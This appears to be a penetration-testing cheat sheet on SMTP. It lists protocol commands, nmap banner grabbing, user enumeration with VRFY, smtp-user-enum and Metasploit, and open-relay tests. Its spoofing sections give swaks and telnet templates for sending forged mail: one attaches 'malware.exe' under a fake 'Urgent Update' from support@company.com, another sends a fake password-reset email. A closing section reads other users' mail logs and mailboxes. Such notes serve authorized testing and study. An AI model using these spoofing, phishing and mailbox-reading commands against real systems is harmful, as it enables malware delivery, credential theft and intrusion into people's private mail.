# SMTP
```table-of-contents
```

## Command Reference
| **Command**   | **Description**                                                 |
| ------------- | --------------------------------------------------------------- |
| `HELO`      | Client identifies itself (Basic).                               |
| `EHLO`      | Client identifies itself (Extended - shows supported features). |
| `MAIL FROM` | Sets the sender address (Source).                               |
| `RCPT TO`   | Sets the recipient address (Destination).                       |
| `DATA`      | Starts the body of the email. End with `<CR><LF>.<CR><LF>`.     |
| `VRFY`      | Verify if a user exists on the system.                          |
| `EXPN`      | Expand a mailing list (shows actual users).                     |
| `RSET`      | Resets the current transaction but keeps connection open.       |
| `QUIT`      | Closes the connection.                                          |
## Discovery & Enumeration
```shell
# Nmap - Basic Enum
nmap -p 25 -sC -sV <IP>

# Manual Banner Grabbing (Telnet/NC)
nc -nv <IP> 25
# OR
telnet <IP> 25
```
## User Enumeration
### Manual Verification (VRFY/EXPN)
```shell
# Connect first
telnet <IP> 25

# Try to verify users
VRFY root
VRFY admin
VRFY user1

# Responses:
# 250/252 = User Exists
# 550 = User Unknown
```
### Automated Tools
```shell
# SMTP-User-Enum (The standard tool)
# -M: Method (VRFY, EXPN, RCPT) | -U: Userlist | -t: Target
smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -t <IP>

# Nmap Script
nmap -p 25 --script smtp-enum-users <IP>

# Metasploit
use auxiliary/scanner/smtp/smtp_enum
```
## Open Relay Vulnerability
```shell
# Nmap Script (Check for Open Relay)
nmap -p 25 --script smtp-open-relay <IP>

# Manual Test
# 1. Connect
telnet <IP> 25
# 2. Set sender
MAIL FROM: <attacker@evil.com>
# 3. Set EXTERNAL recipient (Crucial step)
RCPT TO: <victim@gmail.com>
# 4. If server says "250 OK", it might be an open relay.
# 5. If server says "550 Relaying denied", it is secure.
```
## Sending Emails (Spoofing)
### Swaks (Swiss Army Knife for SMTP)
```shell
# Basic Test
swaks --to <VICTIM_EMAIL> --from <SPOOFED_EMAIL> --server <IP>

# With Authentication
swaks --to <VICTIM_EMAIL> --from <EMAIL> --server <IP> --auth --auth-user <USER> --auth-password <PASS>

# Attach a file (Malicious payload)
swaks --to <VICTIM_EMAIL> --from <support@company.com> --server <IP> --header "Subject: Urgent Update" --body "Please install this." --attach @malware.exe
```
### Manual Telnet Interaction
```shell
telnet <IP> 25

EHLO attacker.com
MAIL FROM: <admin@target.com>
RCPT TO: <victim@target.com>
DATA
Subject: Reset Password
From: Admin <admin@target.com>
To: Victim <victim@target.com>

Click this link to reset your password.
.
QUIT
```
## Post-Exploitation (Local)
```shell
# Postfix Configuration
cat /etc/postfix/main.cf | grep -v "#"

# Check for Open Relay config (mynetworks = 0.0.0.0/0)
grep "mynetworks" /etc/postfix/main.cf

# Read Mail Logs (See who is emailing whom)
cat /var/log/mail.log
cat /var/log/maillog

# Read User's Mail
cat /var/mail/<USERNAME>
ls -R /home/<USERNAME>/Maildir/
```